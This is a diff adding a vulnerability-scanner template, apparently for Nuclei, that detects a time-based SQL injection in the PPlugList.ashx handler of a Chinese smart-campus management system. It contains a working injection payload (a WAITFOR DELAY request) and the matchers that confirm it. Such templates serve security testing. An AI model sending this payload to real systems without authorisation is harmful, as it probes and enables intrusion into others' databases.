@@ -1,0 +1,33 @@
+id: poc-yaml-winstaryc-ppluglist-ashx-sqli
+info:
+  name: 智慧校园(安校易)管理系统 PPlugList.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    智慧校园(安校易)管理系统存在一个SQL注入漏洞，该漏洞可通过PPlugList.ashx的action参数进行利用。
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /Module/CJGL/Controller/PPlugList.ashx?action=find&PlugIdentID=1%27;WAITFOR+DELAY+%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "未将对象引用设置到对象的实例"
+          - "应用程序中的服务器错误"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
